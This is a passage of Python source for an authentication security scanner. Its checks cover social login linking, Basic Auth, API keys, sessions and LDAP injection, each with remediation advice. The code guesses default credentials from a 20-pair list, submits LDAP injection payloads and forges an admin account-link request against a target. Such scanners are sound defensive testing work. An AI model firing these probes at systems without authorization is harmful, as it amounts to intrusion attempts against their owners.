                      refs=["RFC 6749 S4.1.3", "OWASP WSTG-ATHN-01"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Critical", 9.1,
                  "T1078", "Valid Accounts",
                  "CWE-287", "A07:2021", "CB-3.5", "PTES-6.1",
                  "Social login callbacks did not accept fabricated auth codes.",
                  "Maintain code verification against provider token endpoint.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_sl03(target: AuthTarget, timeout: int) -> AuthFinding:
    """SL-03: Account Linking Without Email Verification"""
    _CID = "SL-03"
    _PROTO = "Social Login"
    _TITLE = "Account Linking Without Email Verification"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        base = target.base_url
        s = _session(target)
        link_paths = ["/account/link", "/auth/link", "/social/link",
                      "/connect/google", "/connect/github"]
        tested = []
        for path in link_paths:
            try:
                r = s.post(base + path,
                           data={"email": "admin@" + (
                               urllib.parse.urlparse(target.url).netloc
                               or "example.com"
                           ), "provider": "google", "verified": "true"},
                           timeout=timeout)
                if r.status_code in (200, 201):
                    tested.append(
                        f"{path} (HTTP {r.status_code}) - accepted link attempt "
                        "without OAuth flow"
                    )
            except Exception:
                pass
        if tested:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 8.1,
                      "T1078", "Valid Accounts",
                      "CWE-287", "A07:2021", "CB-3.5", "PTES-6.1",
                      "Account linking endpoint accepted requests without OAuth "
                      "provider verification: " + "; ".join(tested),
                      "Account linking must require a complete, validated OAuth "
                      "flow with the provider. Never accept email as a linking "
                      "parameter without provider token validation.",
                      refs=["OWASP WSTG-ATHN-01"])
        return _f(_CID, _PROTO, _TITLE, "NOT_APPLICABLE", "High", 8.1,
                  "T1078", "Valid Accounts",
                  "CWE-287", "A07:2021", "CB-3.5", "PTES-6.1",
                  "No account linking endpoints found at common paths.",
                  "Test manually if social login linking is present.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_sl04(target: AuthTarget, timeout: int) -> AuthFinding:
    """SL-04: Social Login Endpoint Discovery"""
    _CID = "SL-04"
    _PROTO = "Social Login"
    _TITLE = "Social Login Endpoint Discovery"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.get(target.url, timeout=timeout)
        providers_found = []
        for kw in ["google", "microsoft", "github", "facebook",
                   "apple", "twitter", "linkedin", "okta", "azure"]:
            if kw in r.text.lower():
                providers_found.append(kw)
        if providers_found:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Info", 2.7,
                      "T1590", "Gather Victim Network Information",
                      "CWE-200", "A05:2021", "CB-3.5", "PTES-5.1",
                      f"Social login providers detected on login page: "
                      + ", ".join(providers_found),
                      "Each social login provider expands the attack surface. "
                      "Ensure all provider integrations are fully tested for "
                      "the vulnerabilities in SL-01 through SL-03.",
                      refs=["OWASP WSTG-ATHN-01"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Info", 2.7,
                  "T1590", "Gather Victim Network Information",
                  "CWE-200", "A05:2021", "CB-3.5", "PTES-5.1",
                  "No social login providers detected on the login page.",
                  "No action required.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


# ---------------------------------------------------------------------------
# BA -- Basic / Digest Auth (4 checks)
# ---------------------------------------------------------------------------

def _check_ba01(target: AuthTarget, timeout: int) -> AuthFinding:
    """BA-01: Default Credentials"""
    _CID = "BA-01"
    _PROTO = "Basic Auth"
    _TITLE = "Default Credentials on Basic Authentication"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r0 = s.get(target.url, timeout=timeout, allow_redirects=False)
        if "www-authenticate" not in {k.lower() for k in r0.headers}:
            return _na(_CID, _PROTO, _TITLE)
        default_creds = [
            ("admin", "admin"), ("admin", "password"), ("admin", ""),
            ("admin", "123456"), ("root", "root"), ("root", "toor"),
            ("admin", "admin123"), ("administrator", "password"),
            ("test", "test"), ("guest", "guest"), ("user", "user"),
            ("admin", "letmein"), ("admin", "pass"), ("admin", "changeme"),
            ("superuser", "superuser"), ("operator", "operator"),
            ("support", "support"), ("service", "service"),
            ("monitor", "monitor"), ("demo", "demo"),
        ]
        for user, pw in default_creds:
            try:
                r = s.get(target.url, auth=(user, pw), timeout=timeout,
                          allow_redirects=False)
                if r.status_code == 200:
                    return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Critical", 9.8,
                              "T1110.001", "Brute Force: Password Guessing",
                              "CWE-521", "A07:2021", "CB-3.5", "PTES-6.1",
                              f"Default credentials accepted: "
                              f"username={user!r}, password={pw or '(empty)'!r}",
                              "Change all default credentials immediately. "
                              "Enforce a strong password policy.",
                              refs=["OWASP WSTG-ATHN-02",
                                    "CIS Controls v8 - Control 5"])
            except Exception:
                pass
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Critical", 9.8,
                  "T1110.001", "Brute Force: Password Guessing",
                  "CWE-521", "A07:2021", "CB-3.5", "PTES-6.1",
                  "No default credentials accepted from a 20-pair test list.",
                  "Continue enforcing non-default credentials.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_ba02(target: AuthTarget, timeout: int) -> AuthFinding:
    """BA-02: Realm Information Disclosure"""
    _CID = "BA-02"
    _PROTO = "Basic Auth"
    _TITLE = "Basic Auth Realm Information Disclosure"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.get(target.url, timeout=timeout, allow_redirects=False)
        www_auth = r.headers.get("WWW-Authenticate", "")
        if not www_auth:
            return _na(_CID, _PROTO, _TITLE)
        realm_match = re.search(r'realm=["\']?([^"\'>\s,]+)', www_auth, re.I)
        realm = realm_match.group(1) if realm_match else ""
        sensitive_patterns = [
            r"\b(internal|intranet|corp|corporate|admin|management|"
            r"backend|staging|prod|production|dev|development|"
            r"database|db|secret|private)\b"
        ]
        findings = []
        if realm:
            for pat in sensitive_patterns:
                if re.search(pat, realm, re.I):
                    findings.append(
                        f"Realm {realm!r} reveals sensitive environment: {pat}"
                    )
            if re.search(r"\d+\.\d+\.\d+\.\d+", realm):
                findings.append(f"Realm reveals internal IP: {realm!r}")
        if findings or realm:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Low", 4.0,
                      "T1590", "Gather Victim Network Information",
                      "CWE-200", "A05:2021", "CB-3.1", "PTES-5.1",
                      f"WWW-Authenticate: {www_auth!r}. "
                      + (" Realm disclosure: " + "; ".join(findings)
                         if findings else "Realm value provides environment info."),
                      "Use a generic, non-descriptive realm name such as "
                      "'Secure Area' rather than internal system names.",
                      refs=["OWASP WSTG-INFO-05"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Low", 4.0,
                  "T1590", "Gather Victim Network Information",
                  "CWE-200", "A05:2021", "CB-3.1", "PTES-5.1",
                  "No WWW-Authenticate header present or realm is non-descriptive.",
                  "Maintain generic realm names.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_ba03(target: AuthTarget, timeout: int) -> AuthFinding:
    """BA-03: HTTP Scheme Downgrade"""
    _CID = "BA-03"
    _PROTO = "Basic Auth"
    _TITLE = "HTTPS to HTTP Downgrade / HSTS Missing"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        if not target.url.startswith("https://"):
            return _na(_CID, _PROTO, _TITLE)
        s = _session(target)
        r = s.get(target.url, timeout=timeout, allow_redirects=False)
        hsts = r.headers.get("Strict-Transport-Security", "")
        http_url = target.url.replace("https://", "http://", 1)
        http_accessible = False
        try:
            rh = s.get(http_url, timeout=timeout, allow_redirects=False)
            if rh.status_code in (200, 401):
                http_accessible = True
        except Exception:
            pass
        issues = []
        if not hsts:
            issues.append("Strict-Transport-Security (HSTS) header not set")
        if http_accessible:
            issues.append(
                f"Target accessible over plain HTTP ({http_url!r})"
            )
        if issues:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 5.9,
                      "T1557", "Adversary-in-the-Middle",
                      "CWE-319", "A02:2021", "CB-3.1", "PTES-6.1",
                      "; ".join(issues),
                      "Enable HSTS with a long max-age (min 1 year) and "
                      "includeSubDomains. Redirect all HTTP traffic to HTTPS. "
                      "Submit to HSTS preload list.",
                      refs=["RFC 6797", "OWASP WSTG-CRYP-03"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 5.9,
                  "T1557", "Adversary-in-the-Middle",
                  "CWE-319", "A02:2021", "CB-3.1", "PTES-6.1",
                  f"HSTS is set ({hsts!r}) and HTTP is not accessible.",
                  "Maintain HSTS enforcement.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_ba04(target: AuthTarget, timeout: int) -> AuthFinding:
    """BA-04: Credentials in Server Response / Error Leakage"""
    _CID = "BA-04"
    _PROTO = "Basic Auth"
    _TITLE = "Credential Leakage in Server Response"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.get(target.url, timeout=timeout, allow_redirects=False)
        leak_patterns = [
            (r"[Pp]assword[\s]*[:=][\s]*\S+", "password in response body"),
            (r"[Aa]uthorization[\s]*:[\s]*Basic\s+\S+",
             "Base64 credentials in response"),
            (r"[Bb]earer\s+[A-Za-z0-9\-_\.]{20,}",
             "Bearer token in response body"),
        ]
        found = []
        for pat, label in leak_patterns:
            m = re.search(pat, r.text)
            if m:
                found.append(f"{label}: {m.group(0)[:60]}")
        server = r.headers.get("Server", "")
        x_powered = r.headers.get("X-Powered-By", "")
        if server:
            found.append(f"Server header reveals: {server!r}")
        if x_powered:
            found.append(f"X-Powered-By reveals: {x_powered!r}")
        if found:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 5.5,
                      "T1552", "Unsecured Credentials",
                      "CWE-312", "A02:2021", "CB-3.1", "PTES-5.3",
                      "Credential/technology disclosure in response: "
                      + "; ".join(found[:4]),
                      "Remove Server and X-Powered-By headers. "
                      "Ensure no credentials appear in response bodies. "
                      "Suppress verbose error messages in production.",
                      refs=["OWASP WSTG-INFO-02", "OWASP WSTG-INFO-08"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 5.5,
                  "T1552", "Unsecured Credentials",
                  "CWE-312", "A02:2021", "CB-3.1", "PTES-5.3",
                  "No credential leakage or verbose server banners detected.",
                  "Maintain suppression of server banners and credential data.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


# ---------------------------------------------------------------------------
# AK -- API Key / Bearer Token (4 checks)
# ---------------------------------------------------------------------------

def _check_ak01(target: AuthTarget, timeout: int) -> AuthFinding:
    """AK-01: API Key in URL Parameter"""
    _CID = "AK-01"
    _PROTO = "API Key"
    _TITLE = "API Key Exposed in URL Query Parameter"
    try:
        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        sensitive_keys = ["api_key", "apikey", "key", "token",
                          "access_token", "auth_token", "secret"]
        found = {k: v for k, v in params.items()
                 if k.lower() in sensitive_keys}
        if found or target.api_key:
            all_found = {**found}
            if target.api_key:
                all_found["api_key(provided)"] = target.api_key[:8] + "..."
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 7.5,
                      "T1552.007", "Unsecured Credentials: Container API Keys",
                      "CWE-598", "A07:2021", "CB-3.7", "PTES-5.3",
                      f"API credentials in URL query string: {list(all_found.keys())}. "
                      "Logged by web servers, proxies, browser history and Referer "
                      "headers.",
                      "Pass API keys in request headers (Authorization or X-API-Key), "
                      "not URL parameters. Rotate any exposed keys immediately.",
                      refs=["OWASP API Security Top 10 - API2",
                            "RFC 6750 S2.3"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 7.5,
                  "T1552.007", "Unsecured Credentials: Container API Keys",
                  "CWE-598", "A07:2021", "CB-3.7", "PTES-5.3",
                  "No API key or token parameters found in URL query string.",
                  "Continue using header-based API key transmission.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_ak02(target: AuthTarget, timeout: int) -> AuthFinding:
    """AK-02: Weak API Key Entropy"""
    _CID = "AK-02"
    _PROTO = "API Key"
    _TITLE = "Weak API Key Entropy"
    try:
        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        key = None
        for k in ["api_key", "apikey", "key", "token", "access_token"]:
            if k in params:
                key = params[k]
                break
        if not key and target.api_key:
            key = target.api_key
        if not key:
            return _na(_CID, _PROTO, _TITLE)
        issues = []
        if len(key) < 32:
            issues.append(f"Key length {len(key)} < 32 characters")
        if key.isdigit():
            issues.append("Key is all-numeric (low entropy)")
        if key.isalpha():
            issues.append("Key is all-alphabetic (low entropy)")
        common_keys = {"test", "demo", "sample", "example", "apikey",
                       "secret", "key", "token", "password", "12345678"}
        if key.lower() in common_keys:
            issues.append(f"Key is a trivially guessable value: {key!r}")
        unique_chars = len(set(key))
        if unique_chars < 8:
            issues.append(
                f"Key has only {unique_chars} unique characters "
                "(insufficient character diversity)"
            )
        if issues:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 7.5,
                      "T1552.007", "Unsecured Credentials: Container API Keys",
                      "CWE-330", "A07:2021", "CB-3.7", "PTES-5.3",
                      f"API key entropy issues: {'; '.join(issues)} "
                      f"(key prefix: {key[:8]}...)",
                      "Generate API keys using a cryptographic RNG with at "
                      "least 256 bits of entropy. Keys should be at least "
                      "32 characters from a large character set.",
                      refs=["OWASP API Security Top 10 - API2"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 7.5,
                  "T1552.007", "Unsecured Credentials: Container API Keys",
                  "CWE-330", "A07:2021", "CB-3.7", "PTES-5.3",
                  f"API key appears to have adequate length ({len(key)}) "
                  "and character diversity.",
                  "Continue using cryptographic RNG for API key generation.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_ak03(target: AuthTarget, timeout: int) -> AuthFinding:
    """AK-03: Bearer Token Referrer Exposure"""
    _CID = "AK-03"
    _PROTO = "API Key"
    _TITLE = "Bearer Token Referrer / Header Exposure"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.get(target.url, timeout=timeout)
        issues = []
        token_in_url = re.search(
            r"[?&](token|access_token|bearer)=([A-Za-z0-9\-_\.]{20,})",
            target.url, re.I
        )
        if token_in_url:
            issues.append(
                f"Bearer token in URL: param={token_in_url.group(1)!r}"
            )
        rp = r.headers.get("Referrer-Policy", "")
        if not rp or rp.lower() in ("unsafe-url", "no-referrer-when-downgrade"):
            issues.append(
                f"Referrer-Policy is {rp or 'absent'!r} - "
                "URL tokens may leak via Referer header"
            )
        if issues:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 6.1,
                      "T1552", "Unsecured Credentials",
                      "CWE-598", "A07:2021", "CB-3.7", "PTES-5.3",
                      "; ".join(issues),
                      "Set Referrer-Policy: no-referrer. "
                      "Pass tokens in Authorization header, not URL parameters.",
                      refs=["RFC 6750 S2.3", "W3C Referrer-Policy"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 6.1,
                  "T1552", "Unsecured Credentials",
                  "CWE-598", "A07:2021", "CB-3.7", "PTES-5.3",
                  "No bearer token in URL and Referrer-Policy is appropriate.",
                  "Maintain Referrer-Policy and header-based token transmission.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_ak04(target: AuthTarget, timeout: int) -> AuthFinding:
    """AK-04: API Key Not Invalidated (Rotation Test)"""
    _CID = "AK-04"
    _PROTO = "API Key"
    _TITLE = "API Key Lifecycle / Revocation"
    return _f(_CID, "API Key", _TITLE, "NOT_APPLICABLE", "High", 6.5,
              "T1552", "Unsecured Credentials",
              "CWE-613", "A07:2021", "CB-3.7", "PTES-6.1",
              "API key revocation testing requires the ability to rotate keys "
              "in the target system and then replay the old key. Perform this "
              "test manually: rotate the API key in the portal, then replay "
              "the old key via Burp Repeater to confirm it is invalidated.",
              "Implement immediate API key invalidation on rotation. "
              "Old keys must return HTTP 401 within seconds of rotation.",
              refs=["OWASP API Security Top 10 - API2"])


# ---------------------------------------------------------------------------
# SE -- Session Management (5 checks)
# ---------------------------------------------------------------------------

def _check_se01(target: AuthTarget, timeout: int) -> AuthFinding:
    """SE-01: Cookie Security Flags"""
    _CID = "SE-01"
    _PROTO = "Session"
    _TITLE = "Session Cookie Missing Security Flags"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.get(target.url, timeout=timeout)
        set_cookie = r.headers.get("Set-Cookie", "")
        all_cookies = r.headers.getlist(
            "Set-Cookie"
        ) if hasattr(r.headers, "getlist") else [
            v for k, v in r.headers.items() if k.lower() == "set-cookie"
        ]
        if not all_cookies and not set_cookie:
            all_cookies = [set_cookie] if set_cookie else []
        issues = []
        for cookie in all_cookies:
            c_lower = cookie.lower()
            name = cookie.split("=")[0].strip()
            if "httponly" not in c_lower:
                issues.append(f"{name!r}: missing HttpOnly")
            if "secure" not in c_lower:
                issues.append(f"{name!r}: missing Secure flag")
            if "samesite" not in c_lower:
                issues.append(f"{name!r}: missing SameSite attribute")
        if issues:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 5.4,
                      "T1539", "Steal Web Session Cookie",
                      "CWE-614", "A07:2021", "CB-3.5", "PTES-6.1",
                      "Session cookie security flag deficiencies: "
                      + "; ".join(issues[:6]),
                      "Set HttpOnly, Secure, and SameSite=Strict (or Lax) "
                      "on all session cookies.",
                      refs=["OWASP WSTG-SESS-02", "RFC 6265"])
        if all_cookies:
            return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 5.4,
                      "T1539", "Steal Web Session Cookie",
                      "CWE-614", "A07:2021", "CB-3.5", "PTES-6.1",
                      "All session cookies have HttpOnly, Secure, and "
                      "SameSite attributes set.",
                      "Maintain cookie security flag configuration.")
        return _na(_CID, _PROTO, _TITLE)
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_se02(target: AuthTarget, timeout: int) -> AuthFinding:
    """SE-02: Session Not Invalidated on Logout"""
    _CID = "SE-02"
    _PROTO = "Session"
    _TITLE = "Session Not Invalidated on Logout"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    if not target.session_cookie:
        return _na(_CID, _PROTO, _TITLE)
    try:
        base = target.base_url
        s = _session(target)
        logout_paths = ["/logout", "/signout", "/sign-out", "/auth/logout",
                        "/session/destroy", "/api/logout"]
        logout_url = None
        for p in logout_paths:
            try:
                r = s.get(base + p, timeout=timeout, allow_redirects=False)
                if r.status_code in (200, 302, 301, 204):
                    logout_url = base + p
                    break
            except Exception:
                pass
        if not logout_url:
            return _na(_CID, _PROTO, _TITLE)
        s.get(logout_url, timeout=timeout)
        s2 = _session(target)
        r_after = s2.get(target.url, timeout=timeout, allow_redirects=False)
        if r_after.status_code == 200 and any(
            kw in r_after.text.lower() for kw in
            ["dashboard", "welcome", "profile", "account", "logged in"]
        ):
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 6.5,
                      "T1563", "Remote Service Session Hijacking",
                      "CWE-613", "A07:2021", "CB-3.5", "PTES-6.1",
                      "Session cookie remained valid after logout. "
                      "Reusing old session cookie returned authenticated content "
                      f"(HTTP {r_after.status_code}).",
                      "Invalidate the server-side session on logout immediately. "
                      "Do not rely solely on clearing the client-side cookie.",
                      refs=["OWASP WSTG-SESS-06"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 6.5,
                  "T1563", "Remote Service Session Hijacking",
                  "CWE-613", "A07:2021", "CB-3.5", "PTES-6.1",
                  "Session cookie was invalidated correctly after logout.",
                  "Maintain server-side session invalidation on logout.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_se03(target: AuthTarget, timeout: int) -> AuthFinding:
    """SE-03: Excessive Session Lifetime"""
    _CID = "SE-03"
    _PROTO = "Session"
    _TITLE = "Excessive Session / Cookie Lifetime"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.get(target.url, timeout=timeout)
        all_cookies = [
            v for k, v in r.headers.items() if k.lower() == "set-cookie"
        ]
        issues = []
        for cookie in all_cookies:
            max_age_match = re.search(r"[Mm]ax-[Aa]ge\s*=\s*(\d+)", cookie)
            expires_match = re.search(
                r"[Ee]xpires\s*=\s*([^;]+)", cookie
            )
            name = cookie.split("=")[0].strip()
            if max_age_match:
                age = int(max_age_match.group(1))
                if age > 86400:
                    issues.append(
                        f"{name!r} Max-Age={age}s "
                        f"({age//3600:.0f}h > 24h threshold)"
                    )
        if issues:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Low", 4.3,
                      "T1539", "Steal Web Session Cookie",
                      "CWE-613", "A07:2021", "CB-3.5", "PTES-6.1",
                      "Long-lived session cookies: " + "; ".join(issues[:4]),
                      "Set session cookie Max-Age to no more than 8 hours "
                      "for sensitive applications. Implement server-side "
                      "idle timeout of 15-30 minutes.",
                      refs=["OWASP WSTG-SESS-07", "NIST 800-63B S7.1"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Low", 4.3,
                  "T1539", "Steal Web Session Cookie",
                  "CWE-613", "A07:2021", "CB-3.5", "PTES-6.1",
                  "No excessive cookie lifetimes detected (all Max-Age <= 86400s).",
                  "Maintain appropriate session lifetime policy.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_se04(target: AuthTarget, timeout: int) -> AuthFinding:
    """SE-04: Concurrent Session Not Limited"""
    _CID = "SE-04"
    _PROTO = "Session"
    _TITLE = "Concurrent Session Not Limited"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    if not target.session_cookie:
        return _na(_CID, _PROTO, _TITLE)
    try:
        results = []
        lock = threading.Lock()
        def _req(n):
            s = _session(target)
            try:
                r = s.get(target.url, timeout=target.timeout)
                with lock:
                    results.append(r.status_code)
            except Exception:
                with lock:
                    results.append(0)
        threads = [threading.Thread(target=_req, args=(i,)) for i in range(3)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=target.timeout + 2)
        if all(c == 200 for c in results if c):
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Info", 3.5,
                      "T1563", "Remote Service Session Hijacking",
                      "CWE-613", "A07:2021", "CB-3.5", "PTES-6.1",
                      f"All {len(results)} concurrent requests with the same "
                      "session cookie returned HTTP 200. Concurrent session "
                      "limiting is not enforced.",
                      "Consider limiting concurrent sessions per account for "
                      "high-security applications. Alert users of concurrent "
                      "session creation.",
                      refs=["OWASP WSTG-SESS-08"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Info", 3.5,
                  "T1563", "Remote Service Session Hijacking",
                  "CWE-613", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"Concurrent session results: {results}. Possible limiting "
                  "in effect.",
                  "Verify concurrent session policy meets requirements.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_se05(target: AuthTarget, timeout: int) -> AuthFinding:
    """SE-05: CSRF Protection on Auth Endpoints"""
    _CID = "SE-05"
    _PROTO = "Session"
    _TITLE = "Missing CSRF Protection on Authentication Endpoint"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.get(target.url, timeout=timeout)
        csrf_tokens = re.findall(
            r'(?:name|id)=["\'](?:csrf|_token|authenticity_token|'
            r'csrfmiddlewaretoken|__RequestVerificationToken)["\']',
            r.text, re.I
        )
        csrf_meta = re.findall(
            r'<meta[^>]+name=["\']csrf[^>]+>',
            r.text, re.I
        )
        samesite_cookies = [
            v for k, v in r.headers.items()
            if k.lower() == "set-cookie"
            and "samesite" in v.lower()
        ]
        if not csrf_tokens and not csrf_meta and not samesite_cookies:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 6.1,
                      "T1185", "Browser Session Hijacking",
                      "CWE-352", "A07:2021", "CB-3.5", "PTES-6.1",
                      "No CSRF token found in login form and no SameSite "
                      "cookie attribute detected.",
                      "Add a cryptographically random, per-session CSRF token "
                      "to all state-changing authentication forms. "
                      "Alternatively, set SameSite=Strict on session cookies.",
                      refs=["OWASP WSTG-SESS-05",
                            "OWASP CSRF Prevention Cheatsheet"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 6.1,
                  "T1185", "Browser Session Hijacking",
                  "CWE-352", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"CSRF protection detected: "
                  f"tokens={len(csrf_tokens)}, meta={len(csrf_meta)}, "
                  f"samesite_cookies={len(samesite_cookies)}.",
                  "Maintain CSRF token or SameSite cookie enforcement.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


# ---------------------------------------------------------------------------
# LD -- LDAP Injection (4 checks)
# ---------------------------------------------------------------------------

def _check_ld01(target: AuthTarget, timeout: int) -> AuthFinding:
    """LD-01: Classic LDAP Injection"""
    _CID = "LD-01"
    _PROTO = "LDAP"
    _TITLE = "LDAP Injection in Authentication Fields"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        payloads = [
            ("*", "wrong"),
            ("*)(uid=*))(|(uid=*", "wrong"),
            ("admin)(|(password=*", "wrong"),
            ("\x00", "wrong"),
        ]
        error_patterns = [
            "ldap", "javax.naming", "ldapexception",
            "invalid dn", "filter error", "bad search filter",
            "ldap_bind", "ldap_search",
        ]
        for user, pw in payloads:
            try:
                r = s.post(target.url,
                           data={"username": user, "password": pw,
                                 "email": user},
                           timeout=timeout)
                body_lower = r.text.lower()
                for pat in error_patterns:
                    if pat in body_lower:
                        return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Critical", 9.1,
                                  "T1190", "Exploit Public-Facing Application",
                                  "CWE-90", "A03:2021", "CB-3.3", "PTES-6.2",
                                  f"LDAP error pattern {pat!r} in response to "
                                  f"payload username={user!r}. "
                                  "LDAP filter injection may allow authentication bypass.",
                                  "Use an LDAP safe string filter that escapes special "
                                  "characters: \\, *, (, ), NUL. "
                                  "Use parameterised LDAP queries (RFC 4515).",
                                  refs=["OWASP WSTG-INPV-06",
                                        "CWE-90 LDAP Injection"])
                if r.status_code == 200 and user == "*":
                    body_lower = r.text.lower()
                    if any(kw in body_lower for kw in
                           ["welcome", "dashboard", "logged in", "profile"]):
                        return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Critical", 9.1,
                                  "T1190", "Exploit Public-Facing Application",
                                  "CWE-90", "A03:2021", "CB-3.3", "PTES-6.2",
                                  f"Wildcard (*) username returned authenticated "
                                  f"content (HTTP {r.status_code}). LDAP injection "
                                  "authentication bypass confirmed.",
                                  "Escape all LDAP special characters in user input. "
                                  "Use allow-listing for valid username characters.",
                                  refs=["OWASP WSTG-INPV-06"])
            except Exception:
                pass
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Critical", 9.1,
                  "T1190", "Exploit Public-Facing Application",
                  "CWE-90", "A03:2021", "CB-3.3", "PTES-6.2",
                  "No LDAP error patterns or wildcard bypass detected.",
                  "Continue using parameterised LDAP queries.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_ld02(target: AuthTarget, timeout: int) -> AuthFinding:
    """LD-02: Blind LDAP Injection via Timing"""
    _CID = "LD-02"
    _PROTO = "LDAP"
    _TITLE = "Blind LDAP Injection via Timing"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        def _time_req(user):
            start = time.monotonic()
            try:
                s.post(target.url,
                       data={"username": user, "password": "wrong"},
                       timeout=timeout)
            except Exception:
                pass
            return time.monotonic() - start
        normal = _time_req("normaluser")
        ldap_wild = _time_req("admin*")
        delta = abs(ldap_wild - normal)
        if delta > 0.5:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 7.5,
                      "T1190", "Exploit Public-Facing Application",
                      "CWE-90", "A03:2021", "CB-3.3", "PTES-6.2",
                      f"Timing delta {delta:.3f}s between wildcard LDAP payload "
                      f"({ldap_wild:.3f}s) and normal username ({normal:.3f}s). "
                      "Blind LDAP injection may enable information extraction.",
                      "Use constant-time LDAP query execution or parameterised "
                      "queries to prevent timing-based inference.",
                      refs=["OWASP WSTG-INPV-06"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 7.5,
                  "T1190", "Exploit Public-Facing Application",
                  "CWE-90", "A03:2021", "CB-3.3", "PTES-6.2",
                  f"Timing delta {delta:.3f}s (< 500ms threshold). "
                  "No significant blind LDAP timing difference detected.",
                  "Maintain parameterised LDAP queries.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_ld03(target: AuthTarget, timeout: int) -> AuthFinding:
    """LD-03: LDAP DN Injection"""
    _CID = "LD-03"
    _PROTO = "LDAP"
    _TITLE = "LDAP DN Injection"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        dn_payloads = [
            "cn=admin,dc=example,dc=com",
            "uid=admin,ou=people,dc=example,dc=com",
            "admin, dc=corp",
        ]
        for payload in dn_payloads:
            try:
                r = s.post(target.url,
                           data={"username": payload, "password": "wrong"},
                           timeout=timeout)
                body_lower = r.text.lower()
                if any(kw in body_lower for kw in
                       ["welcome", "dashboard", "logged in"]):
                    return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 7.5,
                              "T1078", "Valid Accounts",
                              "CWE-116", "A03:2021", "CB-3.3", "PTES-6.2",
                              f"LDAP DN payload {payload!r} returned authenticated "
                              f"content (HTTP {r.status_code}).",
                              "Validate username against an allow-list character "
